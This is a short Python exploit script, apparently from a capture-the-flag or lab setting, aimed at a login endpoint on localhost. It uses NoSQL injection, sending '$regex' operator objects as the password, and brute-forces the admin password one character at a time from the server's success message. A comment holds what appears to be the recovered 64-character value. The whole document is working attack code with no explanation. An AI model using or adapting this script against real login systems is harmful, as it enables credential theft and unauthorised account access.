import requests
import string


url = "http://127.0.0.1:5000"

# 87f36cd136b3000e5eab7a5fcf8fe190bd538d257f48e0952fac53f245f2cfb4
password = ""

while len(password) < 64:
    for c in string.digits + string.ascii_letters:
        r = requests.post(url + '/login', json={'username': 'admin', 'password': {'$regex': f'^{password + c}'}})
        if 'Login Success.' in r.text:
            password += c
            print(password)
            break